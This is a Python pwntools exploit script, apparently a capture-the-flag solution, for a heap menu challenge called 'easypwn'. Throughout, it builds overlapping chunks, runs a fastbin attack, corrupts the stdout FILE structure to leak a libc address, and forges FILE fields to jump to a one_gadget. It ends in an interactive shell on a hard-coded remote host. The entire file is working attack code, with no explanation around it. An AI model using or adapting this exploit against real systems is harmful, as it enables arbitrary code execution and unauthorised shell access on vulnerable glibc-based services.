from pwn import *

context.log_level = 'debug'

def create(size):
    p.sendlineafter('Your choice:\n','1')
    p.sendlineafter('size:\n',str(size))

def edit(idx,content):
    p.sendlineafter('Your choice:\n','2')
    p.sendlineafter('idx:',str(idx))
    p.sendafter('content:\n',content)

def editn(idx,content):
    p.sendlineafter('Your choice:\n','2')
    p.sendlineafter('idx:',str(idx))
    p.sendlineafter('content:\n',content)

def delete(idx):
    p.sendlineafter('Your choice:\n','3')
    p.sendlineafter('idx:',str(idx))

def edit_no_n(idx,content):
    p.sendlineafter('Your choice:','2')
    p.sendlineafter('idx:',str(idx))
    p.sendlineafter('content:',content)

def create_no_n(size):
    p.sendlineafter('Your choice:','1')
    p.sendlineafter('size:',str(size))

def delete_no_n(idx):
    p.sendlineafter('Your choice:','3')
    p.sendlineafter('idx:',str(idx))

def exp():
    create(0x98)#0
    create(0x98)#1
    create(0xf8)#2
    create(0x20)#3

    delete(0)
    edit(1,'\x00'*0x90+p64(0x140))
    delete(2)

    create(0xe8)#0
    editn(1,'A'*0x40+p64(0)+p64(0x151)+p64(0x0)+p16(0x27e8))
    create(0x140)#2

    editn(2,'\x00'*0xe8+p64(0x61))
    editn(1,'A'*0x40+p64(0)+p64(0xf1))
    delete(2)
    editn(1,'A'*0x40+p64(0)+p64(0xf1)+p16(0x15cf))
    
    #--fastbin-attack--
    create(0xe8)#2
    create(0xe8)#4  stdout
    editn(4,'\x00'*0x41+p64(0xfbad1800)+p64(0x0)*3+'\x00')
    
    stdout = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00'))
    p.recv()
    print('stdout:'+hex(stdout))
    libc_base = stdout - 0x3c5600
    print('libc base:'+hex(libc_base))

    p.sendline('3')
    p.sendlineafter('idx:','2')
    edit_no_n(1,'a'*0x40+p64(0)+p64(0xf1)+p64(libc_base+libc.symbols['_IO_2_1_stdin_']+143))
    create_no_n(0xe8)#2
    create_no_n(0xe8)#5

    payload = '0'
    payload += p64(libc_base+libc.symbols['_IO_2_1_stdout_']-0x40)#fp->_wide_data
    payload += p64(0)*3
    payload += p64(1)#mode
    payload += p64(0)
    payload += p64(libc_base+0x4527a)#one_gadget
    payload += p64(libc_base+libc.symbols['_IO_2_1_stdout_']-0x28)
    edit_no_n(4,payload)


#p.interactive()

if __name__ == '__main__' :
    flag = 1
    while(flag):
        #p = process('./easypwn')
        p = remote('39.101.184.181',10000)
        elf = ELF('./easypwn')
        libc = ELF('./libc-easypwn.so')
        try:
            exp()
            #p.recvuntil('Your choice:')
        except:
            p.close()
            continue
        else:
            flag = 0
            #gdb.attach(p)
            p.interactive()
            pass
